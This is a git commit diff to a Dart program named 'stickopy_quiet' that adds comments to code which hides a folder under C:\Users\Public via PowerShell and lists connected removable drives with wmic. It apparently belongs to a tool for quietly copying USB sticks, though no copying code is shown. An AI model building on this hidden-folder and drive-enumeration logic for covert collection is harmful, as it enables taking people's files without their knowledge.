d46117b3ef22a654eb540d4a397b5e719257d8e9
Firmin L <45711398+firmin-launay@users.noreply.github.com>
2021-02-05 18:16:24 +0100

    Comment code and apply modifications to all modes

--- stickopy_quiet/main.dart
+++ stickopy_quiet/main.dart
@@ -12,17 +12,24 @@ main() {
     "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
   ]); // Set the folder as hidden.
 
-  Process.run(
-          'wmic', ['logicaldisk', 'where', 'drivetype=2', 'get', 'DeviceID'])
+  Process.run('wmic', [
+    'logicaldisk',
+    'where',
+    'drivetype=2',
+    'get',
+    'DeviceID'
+  ]) // Check all drives of type "2" (= removable disk) connected to the device.
       .then((result) {
     String output = result.stdout;
-    output = output.replaceAll("DeviceID", "").replaceAll(" ", "");
+    output = output.replaceAll("DeviceID", "").replaceAll(
+        " ", ""); // Remove all useless infos in the output of the command.
 
     LineSplitter ls = new LineSplitter();
-    List<String> lines = ls.convert(output);
+    List<String> lines = ls.convert(output); // Divide the output into a List.
     print(lines);
     String line;
     for (line in lines) {
+      // Remove extra empty elements from the List.
       if (line == "") {
         //lines.remove(line);
         print(lines);
